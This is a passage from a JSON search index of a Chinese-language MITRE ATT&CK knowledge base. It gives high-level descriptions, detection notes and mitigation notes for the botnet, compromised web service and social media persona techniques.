https://attack.mitre.org/techniques/T1584/005/","title":"T1584-005-\u76d7\u53d6\u57fa\u7840\u8bbe\u65bd-\u50f5\u5c38\u7f51\u7edc"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-005-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C/#t1584-005-","text":"","title":"T1584-005-\u76d7\u53d6\u57fa\u7840\u8bbe\u65bd-\u50f5\u5c38\u7f51\u7edc"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-005-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u653b\u51fb\u8bb8\u591a\u7b2c\u4e09\u65b9\u7cfb\u7edf\uff0c\u4ee5\u5f62\u6210\u4e00\u4e2a\u50f5\u5c38\u7f51\u7edc\uff0c\u5728\u76ee\u6807\u653b\u51fb\u4e2d\u4f7f\u7528\u3002\u50f5\u5c38\u7f51\u7edc\u662f\u4e00\u4e2a\u7531\u88ab\u7834\u574f\u7684\u7cfb\u7edf\u7ec4\u6210\u7684\u7f51\u7edc\uff0c\u53ef\u4ee5\u88ab\u6307\u793a\u6267\u884c\u4e0b\u53d1\u7684\u4efb\u52a1\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u653b\u9677\u8bb8\u591a\u7b2c\u4e09\u65b9\u7cfb\u7edf\u6765\u5efa\u7acb\u81ea\u5df1\u7684\u50f5\u5c38\u7f51\u7edc\uff0c\u800c\u4e0d\u662f\u4ece\u538b\u529b\u6d4b\u8bd5\u670d\u52a1\u5546\u90a3\u91cc\u4e2d\u8d2d\u4e70\u6216\u79df\u7528\u50f5\u5c38\u7f51\u7edc\u3002\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u63a5\u7ba1\u73b0\u6709\u7684\u50f5\u5c38\u7f51\u7edc\uff0c\u4f8b\u5982\u5c06\u50f5\u5c38\u91cd\u5b9a\u5411\u5230\u653b\u51fb\u8005\u63a7\u5236\u7684C2\u670d\u52a1\u5668\u3002\u6709\u4e86\u50f5\u5c38\u7f51\u7edc\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u8fdb\u884c\u540e\u7eed\u6d3b\u52a8\uff0c\u4f8b\u5982\u5927\u89c4\u6a21\u7f51\u7edc\u9493\u9c7c\u6216\u5206\u5e03\u5f0f\u62d2\u7edd\u670d\u52a1\uff08DDoS\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-005-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C/#_1","text":"\u7b80\u5355\u7684\u6765\u8bb2\uff1a\u5373\u653b\u51fb\u8005\u81ea\u884c\u7ec4\u5efa\u5c5e\u4e8e\u81ea\u5df1\u7684\u50f5\u5c38\u7f51\u7edc\u7cfb\u7edf\uff0c\u901a\u8fc7\u653b\u51fb\u7b2c\u4e09\u65b9\u7cfb\u7edf\u7684\u624b\u6bb5\u3002 \u50f5\u5c38\u7f51\u7edcBotnet\u662f\u6307\u91c7\u7528\u4e00\u79cd\u6216\u591a\u79cd\u4f20\u64ad\u624b\u6bb5\uff0c\u5c06\u5927\u91cf\u4e3b\u673a\u611f\u67d3bot\u7a0b\u5e8f\uff08\u50f5\u5c38\u7a0b\u5e8f\uff09\u75c5\u6bd2\uff0c\u4ece\u800c\u5728\u63a7\u5236\u8005\u548c\u88ab\u611f\u67d3\u4e3b\u673a\u4e4b\u95f4\u6240\u5f62\u6210\u7684\u4e00\u4e2a\u53ef\u4e00\u5bf9\u591a\u63a7\u5236\u7684\u7f51\u7edc\u3002 \u653b\u51fb\u8005\u901a\u8fc7\u5404\u79cd\u9014\u5f84\u4f20\u64ad\u50f5\u5c38\u7a0b\u5e8f\u611f\u67d3\u4e92\u8054\u7f51\u4e0a\u7684\u5927\u91cf\u4e3b\u673a\uff0c\u800c\u88ab\u611f\u67d3\u7684\u4e3b\u673a\u5c06\u901a\u8fc7\u4e00\u4e2a\u63a7\u5236\u4fe1\u9053\u63a5\u6536\u653b\u51fb\u8005\u7684\u6307\u4ee4\uff0c\u7ec4\u6210\u4e00\u4e2a\u50f5\u5c38\u7f51\u7edc\u3002\u4e4b\u6240\u4ee5\u7528\u50f5\u5c38\u7f51\u7edc\u8fd9\u4e2a\u540d\u5b57\uff0c\u662f\u4e3a\u4e86\u66f4\u5f62\u8c61\u5730\u8ba9\u4eba\u4eec\u8ba4\u8bc6\u5230\u8fd9\u7c7b\u5371\u5bb3\u7684\u7279\u70b9\uff1a\u4f17\u591a\u7684\u8ba1\u7b97\u673a\u5728\u4e0d\u77e5\u4e0d\u89c9\u4e2d\u5982\u540c\u4e2d\u56fd\u53e4\u8001\u4f20\u8bf4\u4e2d\u7684\u50f5\u5c38\u7fa4\u4e00\u6837\u88ab\u4eba\u9a71\u8d76\u548c\u6307\u6325\u7740\uff0c\u6210\u4e3a\u88ab\u4eba\u5229\u7528\u7684\u4e00\u79cd\u5de5\u5177\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-005-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-005-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-005-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-005-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-005-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C/#_6","text":"","title":"\u5efa\u8bae"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-005-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C/#_7","text":"\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002","title":"\u7f13\u89e3\u63aa\u65bd"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-005-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C/#_8","text":"\u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\uff08\u53d7\u5bb3\u8005\uff09\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u68c0\u6d4b\u8fd9\u79cd\u884c\u4e3a\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\u7f51\u7edc\u9493\u9c7c\u3001\u7aef\u70b9\u62d2\u7edd\u670d\u52a1\u6216\u7f51\u7edc\u62d2\u7edd\u670d\u52a1\u671f\u95f4\u3002","title":"\u68c0\u6d4b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-005-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C/#_9","text":"MITRE-ATT&CK-T1584-005 https://attack.mitre.org/techniques/T1584/005/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-006-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-web%E6%9C%8D%E5%8A%A1/","text":"T1584-006-\u76d7\u53d6\u57fa\u7840\u8bbe\u65bd-web\u670d\u52a1 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u7834\u574f\u5bf9\u7b2c\u4e09\u65b9\u7f51\u7edc\u670d\u52a1\u7684\u8bbf\u95ee\uff0c\u8fd9\u4e9b\u670d\u52a1\u53ef\u4ee5\u5728\u653b\u51fb\u76ee\u6807\u671f\u95f4\u4f7f\u7528\u3002\u6709\u5404\u79cd\u6d41\u884c\u7684\u7f51\u7ad9\u4f9b\u5408\u6cd5\u7528\u6237\u6ce8\u518c\u57fa\u4e8e\u7f51\u7edc\u7684\u670d\u52a1\uff0c\u5982GitHub\u3001Twitter\u3001Dropbox\u3001\u8c37\u6b4c\u7b49\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u53d6\u5f97\u5408\u6cd5\u7528\u6237\u5bf9\u7f51\u7edc\u670d\u52a1\u7684\u8bbf\u95ee\u6743\uff0c\u5e76\u5c06\u8be5\u7f51\u7edc\u670d\u52a1\u7528\u4f5c\u652f\u6301\u7f51\u7edc\u64cd\u4f5c\u7684\u57fa\u7840\u8bbe\u65bd\u3002\u6b64\u7c7bWeb\u670d\u52a1\u53ef\u80fd\u4f1a\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u540e\u671f\u9636\u6bb5\u88ab\u6ee5\u7528\uff0c\u4f8b\u5982\u5728\u547d\u4ee4\u548c\u63a7\u5236 (Web\u670d\u52a1) \u6216\u901a\u8fc7 Web\u670d\u52a1\u6e17\u900f\u3002\u4f7f\u7528\u901a\u7528\u670d\u52a1\uff0c\u4f8b\u5982Google\u6216Twitter\u63d0\u4f9b\u7684\u670d\u52a1\uff0c\u53ef\u4ee5\u8ba9\u653b\u51fb\u8005\u66f4\u5bb9\u6613\u9690\u85cf\u5728\u9884\u671f\u7684\u566a\u97f3\uff08\u6b63\u5e38\u884c\u4e3a\u4e2d\uff09\u4e2d\u3002\u901a\u8fc7\u4f7f\u7528Web\u670d\u52a1\uff0c\u7279\u522b\u662f\u5f53\u5408\u6cd5\u7528\u6237\u7684\u8bbf\u95ee\u6743\u9650\u88ab\u76d7\u65f6\uff0c\u53ef\u80fd\u5f88\u96be\u5c06\u64cd\u4f5c\u4e0e\u4ed6\u4eec\uff08\u653b\u51fb\u8005\uff09\u8054\u7cfb\u8d77\u6765\u3002 \u6d4b\u8bd5\u6848\u4f8b Turla\u7ecf\u5e38\u5c06\u53d7\u611f\u67d3\u7684WordPress\u7ad9\u70b9\u7528\u4e8eC2\u57fa\u7840\u8bbe\u65bd \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u7f13\u89e3\u63aa\u65bd \u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002 \u68c0\u6d4b \u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u5bf9\u8fd9\u79cd\u884c\u4e3a\u7684\u68c0\u6d4b\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\u6307\u6325\u548c\u63a7\u5236\uff08\u7f51\u7edc\u670d\u52a1\uff09\u6216\u901a\u8fc7\u7f51\u7edc\u670d\u52a1\u6e17\u900f\u671f\u95f4\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1584-006 https://attack.mitre.org/techniques/T1583/006/","title":"T1584-006-\u76d7\u53d6\u57fa\u7840\u8bbe\u65bd-web\u670d\u52a1"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-006-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-web%E6%9C%8D%E5%8A%A1/#t1584-006-web","text":"","title":"T1584-006-\u76d7\u53d6\u57fa\u7840\u8bbe\u65bd-web\u670d\u52a1"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-006-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-web%E6%9C%8D%E5%8A%A1/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u7834\u574f\u5bf9\u7b2c\u4e09\u65b9\u7f51\u7edc\u670d\u52a1\u7684\u8bbf\u95ee\uff0c\u8fd9\u4e9b\u670d\u52a1\u53ef\u4ee5\u5728\u653b\u51fb\u76ee\u6807\u671f\u95f4\u4f7f\u7528\u3002\u6709\u5404\u79cd\u6d41\u884c\u7684\u7f51\u7ad9\u4f9b\u5408\u6cd5\u7528\u6237\u6ce8\u518c\u57fa\u4e8e\u7f51\u7edc\u7684\u670d\u52a1\uff0c\u5982GitHub\u3001Twitter\u3001Dropbox\u3001\u8c37\u6b4c\u7b49\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u53d6\u5f97\u5408\u6cd5\u7528\u6237\u5bf9\u7f51\u7edc\u670d\u52a1\u7684\u8bbf\u95ee\u6743\uff0c\u5e76\u5c06\u8be5\u7f51\u7edc\u670d\u52a1\u7528\u4f5c\u652f\u6301\u7f51\u7edc\u64cd\u4f5c\u7684\u57fa\u7840\u8bbe\u65bd\u3002\u6b64\u7c7bWeb\u670d\u52a1\u53ef\u80fd\u4f1a\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u540e\u671f\u9636\u6bb5\u88ab\u6ee5\u7528\uff0c\u4f8b\u5982\u5728\u547d\u4ee4\u548c\u63a7\u5236 (Web\u670d\u52a1) \u6216\u901a\u8fc7 Web\u670d\u52a1\u6e17\u900f\u3002\u4f7f\u7528\u901a\u7528\u670d\u52a1\uff0c\u4f8b\u5982Google\u6216Twitter\u63d0\u4f9b\u7684\u670d\u52a1\uff0c\u53ef\u4ee5\u8ba9\u653b\u51fb\u8005\u66f4\u5bb9\u6613\u9690\u85cf\u5728\u9884\u671f\u7684\u566a\u97f3\uff08\u6b63\u5e38\u884c\u4e3a\u4e2d\uff09\u4e2d\u3002\u901a\u8fc7\u4f7f\u7528Web\u670d\u52a1\uff0c\u7279\u522b\u662f\u5f53\u5408\u6cd5\u7528\u6237\u7684\u8bbf\u95ee\u6743\u9650\u88ab\u76d7\u65f6\uff0c\u53ef\u80fd\u5f88\u96be\u5c06\u64cd\u4f5c\u4e0e\u4ed6\u4eec\uff08\u653b\u51fb\u8005\uff09\u8054\u7cfb\u8d77\u6765\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-006-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-web%E6%9C%8D%E5%8A%A1/#_1","text":"Turla\u7ecf\u5e38\u5c06\u53d7\u611f\u67d3\u7684WordPress\u7ad9\u70b9\u7528\u4e8eC2\u57fa\u7840\u8bbe\u65bd","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-006-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-web%E6%9C%8D%E5%8A%A1/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-006-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-web%E6%9C%8D%E5%8A%A1/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-006-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-web%E6%9C%8D%E5%8A%A1/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-006-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-web%E6%9C%8D%E5%8A%A1/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-006-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-web%E6%9C%8D%E5%8A%A1/#_6","text":"","title":"\u5efa\u8bae"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-006-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-web%E6%9C%8D%E5%8A%A1/#_7","text":"\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002","title":"\u7f13\u89e3\u63aa\u65bd"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-006-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-web%E6%9C%8D%E5%8A%A1/#_8","text":"\u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u5bf9\u8fd9\u79cd\u884c\u4e3a\u7684\u68c0\u6d4b\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\u6307\u6325\u548c\u63a7\u5236\uff08\u7f51\u7edc\u670d\u52a1\uff09\u6216\u901a\u8fc7\u7f51\u7edc\u670d\u52a1\u6e17\u900f\u671f\u95f4\u3002","title":"\u68c0\u6d4b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1584-006-%E7%9B%97%E5%8F%96%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD-web%E6%9C%8D%E5%8A%A1/#_9","text":"MITRE-ATT&CK-T1584-006 https://attack.mitre.org/techniques/T1583/006/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-001-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/","text":"T1585-001-\u521b\u5efa\u8d26\u6237-\u793e\u4ea4\u5a92\u4f53\u8d26\u6237 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u4ee5\u521b\u5efa\u548c\u57f9\u517b\u793e\u4ea4\u5a92\u4f53\u8d26\u6237\uff0c\u4ee5\u4fbf\u5728\u653b\u51fb\u76ee\u6807\u65f6\u4f7f\u7528\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u521b\u5efa\u793e\u4ea4\u5a92\u4f53\u8d26\u6237\uff0c\u7528\u6765\u5efa\u7acb\u4e00\u4e2a\u89d2\u8272\uff0c\u4ee5\u8fdb\u4e00\u6b65\u5f00\u5c55\u884c\u52a8\u3002\u89d2\u8272\u5f00\u53d1\u5305\u62ec\u5f00\u53d1\u516c\u5171\u4fe1\u606f\u3001\u5b58\u5728\u611f\u3001\u5386\u53f2\u548c\u9002\u5f53\u7684\u9644\u5c5e\u5173\u7cfb\u3002 \u5bf9\u4e8e\u5305\u542b\u793e\u4f1a\u5de5\u7a0b\u7684\u884c\u52a8\u6765\u8bf4\uff0c\u5728\u793e\u4ea4\u5a92\u4f53\u4e0a\u5229\u7528\u4e00\u4e2a\u89d2\u8272\u53ef\u80fd\u5f88\u91cd\u8981\u3002\u8fd9\u4e9b\u89d2\u8272\u53ef\u80fd\u662f\u865a\u6784\u7684\uff0c\u4e5f\u53ef\u80fd\u5192\u5145\u771f\u5b9e\u7684\u4eba\u3002\u89d2\u8272\u53ef\u4ee5\u5b58\u5728\u4e8e\u4e00\u4e2a\u793e\u4ea4\u5a92\u4f53\u7f51\u7ad9\u6216\u591a\u4e2a\u7f51\u7ad9\u4e0a\uff08\u4f8b\u5982\uff1aFacebook\u3001LinkedIn\u3001Twitter\u7b49\uff09\u3002\u5728\u793e\u4ea4\u5a92\u4f53\u4e0a\u5efa\u7acb\u4e00\u4e2a\u89d2\u8272\u53ef\u80fd\u9700\u8981\u5f00\u53d1\u989d\u5916\u7684\u6587\u4ef6\uff0c\u4ee5\u4f7f\u4ed6\u4eec\u770b\u8d77\u6765\u771f\u5b9e\u3002\u8fd9\u53ef\u80fd\u5305\u62ec\u586b\u5199\u4e2a\u4eba\u8d44\u6599\u4fe1\u606f\uff0c\u53d1\u5c55\u793e\u4ea4\u7f51\u7edc\uff0c\u6216\u52a0\u5165\u7167\u7247\u3002 \u4e00\u65e6\u5efa\u7acb\u4e86\u4e00\u4e2a\u89d2\u8272\uff0c\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u5229\u7528\u5b83\u4e0e\u611f\u5174\u8da3\u7684\u76ee\u6807\u5efa\u7acb\u8054\u7cfb\u3002\u8fd9\u4e9b\u8fde\u63a5\u53ef\u80fd\u662f\u76f4\u63a5\u7684\uff0c\u4e5f\u53ef\u80fd\u5305\u62ec\u8bd5\u56fe\u901a\u8fc7\u4ed6\u4eba\u8fdb\u884c\u8fde\u63a5\u3002\u8fd9\u4e9b\u8d26\u6237\u53ef\u80fd\u4f1a\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u5176\u4ed6\u9636\u6bb5\u88ab\u5229\u7528\uff0c\u4f8b\u5982\u5728\u521d\u59cb\u8bbf\u95ee\u671f\u95f4\uff08\u4f8b\u5982\uff1a\u901a\u8fc7\u670d\u52a1\u8fdb\u884c\u9c7c\u53c9\u5f0f\u9493\u9c7c\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b \u65e0 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u7f13\u89e3\u63aa\u65bd \u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002 \u68c0\u6d4b \u8003\u8651\u76d1\u6d4b\u4e0e\u4f60\u7684\u7ec4\u7ec7\u6709\u5173\u7684\u793e\u4ea4\u5a92\u4f53\u6d3b\u52a8\u3002\u53ef\u7591\u7684\u6d3b\u52a8\u53ef\u80fd\u5305\u62ec\u58f0\u79f0\u4e3a\u60a8\u7684\u7ec4\u7ec7\u5de5\u4f5c\u7684\u89d2\u8272\uff0c\u6216\u6700\u8fd1\u4fee\u6539\u8fc7\u7684\u8d26\u6237\u5411\u4e0e\u60a8\u7684\u7ec4\u7ec7\u76f8\u5173\u7684\u8d26\u6237\u63d0\u51fa\u5927\u91cf\u8fde\u63a5\u8bf7\u6c42\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u4ee5\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\u521d\u59cb\u8bbf\u95ee\u671f\u95f4\uff08\u4f8b\u5982\uff1a\u901a\u8fc7\u670d\u52a1\u8fdb\u884c\u9c7c\u53c9\u5f0f\u9493\u9c7c\uff09\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1585-001 https://attack.mitre.org/techniques/T1585/001/","title":"T1585-001-\u521b\u5efa\u8d26\u6237-\u793e\u4ea4\u5a92\u4f53\u8d26\u6237"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-001-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#t1585-001-","text":"","title":"T1585-001-\u521b\u5efa\u8d26\u6237-\u793e\u4ea4\u5a92\u4f53\u8d26\u6237"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1585-001-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93%E8%B4%A6%E6%88%B7/#attck","text":"\u653b\u51fb\u8005\u53ef\u4ee5\u521b\u5efa\u548c\u57f9\u517b\u793e\u4ea4\u5a92\u4f53\u8d26\u6237\uff0c\u4ee5\u4fbf\u5728\u653b\u51fb\u76ee\u6807\u65f6\u4f7f\u7528\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u521b\u5efa\u793e\u4ea4\u5a92\u4f53\u8d26\u6237\uff0c\u7528\u6765\u5efa\u7acb\u4e00\u4e2a\u89d2\u8272\uff0c\u4ee5\u8fdb\u4e00\u6b65\u5f00\u5c55\u884c\u52a8\u3002\u89d2\u8272\u5f00\u53d1\u5305\u62ec\u5f00\u53d1\u516c\u5171\u4fe1\u606f\u3001\u5b58\u5728\u611f\u3001\u5386\u53f2\u548c\u9002\u5f53\u7684\u9644\u5c5e\u5173\u7cfb\u3002 \u5bf9\u4e8e\u5305\u542b\u793e\u4f1a\u5de5\u7a0b\u7684\u884c\u52a8\u6765\u8bf4\uff0c\u5728\u793e\u4ea4\u5a92\u4f53\u4e0a\u5229\u7528\u4e00\u4e2a\u89d2\u8272\u53ef\u80fd\u5f88\u91cd\u8981\u3002\u8fd9\u4e9b\u89d2\u8272\u53ef\u80fd\u662f\u865a\u6784\u7684\uff0c\u4e5f\u53ef\u80fd\u5192\u5145\u771f\u5b9e\u7684\u4eba\u3002\u89d2\u8272\u53ef\u4ee5\u5b58\u5728\u4e8e\u4e00\u4e2a\u793e\u4ea4\u5a92\u4f53\u7f51\u7ad9\u6216\u591a\u4e2a\u7f51\u7ad9\u4e0a\uff08\u4f8b\u5982\uff1aFacebook\u3001LinkedIn\u3001Twitter\u7b49\uff09\u3002\u5728\u793e\u4ea4\u5a92\u4f53\u4e0a\u5efa\u7acb\u4e00\u4e2a\u89d2\u8272\u53ef\u80fd\u9700\u8981\u5f00\u53d1\u989d\u5916\u7684\u6587\u4ef6\uff0c\u4ee5\u4f7f\u4ed6\u4eec\u